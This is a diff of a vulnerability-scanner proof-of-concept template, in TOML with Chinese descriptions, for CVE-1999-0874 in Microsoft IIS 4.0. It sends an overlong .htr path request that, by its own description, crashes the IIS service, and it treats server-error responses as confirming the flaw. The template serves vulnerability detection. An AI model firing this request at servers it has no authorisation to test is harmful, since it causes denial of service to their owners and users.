@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = "验证 Microsoft IIS 4.0 在处理 .HTR、.IDC 或 .STM 扩展名请求时存在的缓冲区溢出漏洞。通过向目标发送包含超长畸形字段的 HTTP 请求，观察服务器是否发生拒绝服务（连接重置/无响应），以判断目标是否受 CVE-1999-0874 影响。"
+author = "AVE"
+description = "检测 Microsoft IIS 4.0 HTR/IDC/STM 文件请求缓冲区溢出漏洞，通过发送超长畸形 .htr 路径请求触发 IIS 服务崩溃"
 id = "POC-AVE-1999-1009"
-name = "CVE-1999-0874 Microsoft IIS 4.0 .HTR/.IDC/.STM 缓冲区溢出 PoC"
-severity = "critical"
-tags = ["ave-1999-1009"]
+name = "CVE-1999-0874 PoC"
+severity = "high"
+tags = ["cve-1999-0874"]
 vuln_id = [
     "CVE-1999-0874",
     "AVE-1999-1009",
@@ -15,88 +15,15 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/default.htr"
+path = "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.htr"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    500,
-    502,
-    503,
-    504,
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Server Error",
+    "Service Unavailable",
 ]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = '/{{BaseURL}}/AAAA{{repeat("A", 5000)}}.htr'
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [
-    500,
-    502,
-    503,
-    504,
-]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/default.idc"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [
-    500,
-    502,
-    503,
-    504,
-]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/default.stm"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [
-    500,
-    502,
-    503,
-    504,
-]
-type = "status"
